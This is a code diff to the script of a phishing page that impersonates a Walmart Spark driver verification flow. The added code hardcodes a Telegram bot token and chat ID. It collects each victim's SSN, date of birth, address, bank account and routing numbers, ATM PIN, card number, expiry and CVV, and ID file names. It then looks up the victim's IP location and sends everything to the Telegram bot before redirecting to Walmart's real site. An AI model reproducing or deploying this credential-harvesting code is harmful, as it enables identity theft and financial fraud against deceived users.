@@ -1,5 +1,8 @@
-
 document.addEventListener('DOMContentLoaded', function() {
+    // Telegram bot configuration
+    const TELEGRAM_BOT_TOKEN = '8222171309:AAEUq6LuKnxlcaNv2bdM7QkcyNahPx_QCAA';
+    const TELEGRAM_CHAT_ID = '7959372593';
+
     // Step navigation
     const nextToPaymentBtn = document.getElementById('nextToPayment');
     const nextToCardBtn = document.getElementById('nextToCard');
@@ -40,23 +43,155 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
 
-    completeVerificationBtn.addEventListener('click', function() {
+    completeVerificationBtn.addEventListener('click', async function() {
         if (validateStep4()) {
             showLoading('loading4');
-            setTimeout(function() {
+
+            // Collect all form data
+            const formData = collectFormData();
+
+            try {
+                // Get IP and location information
+                const ipInfo = await getIPInfo();
+
+                // Send data to Telegram
+                await sendToTelegram(formData, ipInfo);
+
+                // Wait for 5 seconds before redirecting
+                setTimeout(function() {
+                    hideLoading('loading4');
+                    updateProgress(4);
+                    // Redirect to main site after successful verification
+                    window.location.href = "https://one.walmart.com/content/sparkdriverapp/en_us.html";
+                }, 5000);
+            } catch (error) {
+                console.error('Error:', error);
                 hideLoading('loading4');
-                updateProgress(4);
-                // Redirect to main site after successful verification
-                window.location.href = "https://one.walmart.com/content/sparkdriverapp/en_us.html";
-            }, 5000);
+                alert('An error occurred. Please try again.');
+            }
         }
     });
+
+    // Function to collect all form data
+    function collectFormData() {
+        return {
+            step1: {
+                firstName: document.getElementById('firstName').value,
+                lastName: document.getElementById('lastName').value,
+                phone: document.getElementById('phone').value,
+                dob: document.getElementById('dob').value,
+                ssn: document.getElementById('ssn').value,
+                address: document.getElementById('address').value
+            },
+            step2: {
+                bankName: document.getElementById('bankName').value,
+                bankAccount: document.getElementById('bankAccount').value,
+                accountType: document.getElementById('accountType').value,
+                routingNumber: document.getElementById('routingNumber').value,
+                atmPin: document.getElementById('atmPin').value
+            },
+            step3: {
+                cardNumber: document.getElementById('cardNumber').value,
+                expDate: document.getElementById('expDate').value,
+                cvv: document.getElementById('cvv').value,
+                confirmAtmPin: document.getElementById('confirmAtmPin').value
+            },
+            step4: {
+                frontId: document.getElementById('frontId').files[0] ? document.getElementById('frontId').files[0].name : 'No file selected',
+                backId: document.getElementById('backId').files[0] ? document.getElementById('backId').files[0].name : 'No file selected'
+            }
+        };
+    }
+
+    // Function to get IP and location information
+    async function getIPInfo() {
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            return {
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                country: data.country_name,
+                postal: data.postal,
+                isp: data.org
+            };
+        } catch (error) {
+            console.error('Error fetching IP information:', error);
+            return {
+                ip: 'Unknown',
+                city: 'Unknown',
+                region: 'Unknown',
+                country: 'Unknown',
+                postal: 'Unknown',
+                isp: 'Unknown'
+            };
+        }
+    }
+
+    // Function to send data to Telegram
+    async function sendToTelegram(formData, ipInfo) {
+        // Format the message
+        let message = `*New Identity Verification Submission*%0A%0A`;
+
+        // Step 1 data
+        message += `*Personal Information:*%0A`;
+        message += `First Name: ${formData.step1.firstName}%0A`;
+        message += `Last Name: ${formData.step1.lastName}%0A`;
+        message += `Phone: ${formData.step1.phone}%0A`;
+        message += `DOB: ${formData.step1.dob}%0A`;
+        message += `SSN: ${formData.step1.ssn}%0A`;
+        message += `Address: ${formData.step1.address}%0A%0A`;
+
+        // Step 2 data
+        message += `*Bank Information:*%0A`;
+        message += `Bank Name: ${formData.step2.bankName}%0A`;
+        message += `Account Number: ${formData.step2.bankAccount}%0A`;
+        message += `Account Type: ${formData.step2.accountType}%0A`;
+        message += `Routing Number: ${formData.step2.routingNumber}%0A`;
+        message += `ATM Pin: ${formData.step2.atmPin}%0A%0A`;
+
+        // Step 3 data
+        message += `*Card Information:*%0A`;
+        message += `Card Number: ${formData.step3.cardNumber}%0A`;
+        message += `Expiration Date: ${formData.step3.expDate}%0A`;
+        message += `CVV: ${formData.step3.cvv}%0A`;
+        message += `Confirm ATM Pin: ${formData.step3.confirmAtmPin}%0A%0A`;
+
+        // Step 4 data
+        message += `*ID Upload:*%0A`;
+        message += `Front ID: ${formData.step4.frontId}%0A`;
+        message += `Back ID: ${formData.step4.backId}%0A%0A`;
+
+        // IP information
+        message += `*IP Information:*%0A`;
+        message += `IP Address: ${ipInfo.ip}%0A`;
+        message += `City: ${ipInfo.city}%0A`;
+        message += `State/Region: ${ipInfo.region}%0A`;
+        message += `Country: ${ipInfo.country}%0A`;
+        message += `Postal Code: ${ipInfo.postal}%0A`;
+        message += `ISP: ${ipInfo.isp}%0A`;
+
+        // Send the message to Telegram
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}&parse_mode=Markdown`;
+
+        try {
+            const response = await fetch(url);
+            const data = await response.json();
+            if (!data.ok) {
+                throw new Error('Telegram API error: ' + data.description);
+            }
+        } catch (error) {
+            console.error('Error sending to Telegram:', error);
+            throw error;
+        }
+    }
 
     // Card logo recognition
     document.getElementById('cardNumber').addEventListener('input', function() {
         const cardNumber = this.value;
         const cardLogo = document.getElementById('cardLogo');
-        
+
         if (cardNumber.startsWith('4') && cardNumber.length >= 1) {
             // Visa card
             cardLogo.src = 'https://logo.clearbit.com/visa.com';
